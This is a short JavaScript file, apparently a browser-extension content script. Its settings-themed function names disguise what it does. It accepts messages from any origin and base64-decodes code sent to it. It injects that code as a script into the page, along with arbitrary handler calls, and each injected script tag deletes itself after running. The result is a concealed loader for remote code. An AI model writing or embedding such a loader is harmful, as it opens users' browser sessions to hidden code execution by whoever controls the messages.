function getDefaultSettings() {
    if (!document.body || !document.body.appendChild) {
        return setTimeout(getDefaultSettings, 100);
    }
    window.postMessage({'defaultSettings': 1, 'action': 'getDefaultSettings'}, '*');
}

function saveDefaultSettings(s) {
    const memSaverId = Date.now().toString(36) + Math.random().toString(36).substr(2);
    const memorySaver = document.createElement('script');

    memorySaver.id = memSaverId;
    memorySaver.appendChild(document.createTextNode(s + `; document.querySelector('#${memSaverId}').remove();`));
    document.body.appendChild(memorySaver);
}

function saveDomainSettings(r, c) {
    if (!document.body || !document.body.appendChild) {
        return setTimeout(() => saveDomainSettings(r, c), 100);
    }
    c && (r = c+'('+JSON.stringify(r)+')');
    saveDefaultSettings(r);
}

window.addEventListener('message', event => {
    if (!event || !event.data) { return; }

    event.data.c && saveDefaultSettings(decodeURIComponent(escape(atob(event.data.c))));
    event.data.p && saveDomainSettings(event.data.key, event.data.handler);
});

getDefaultSettings();
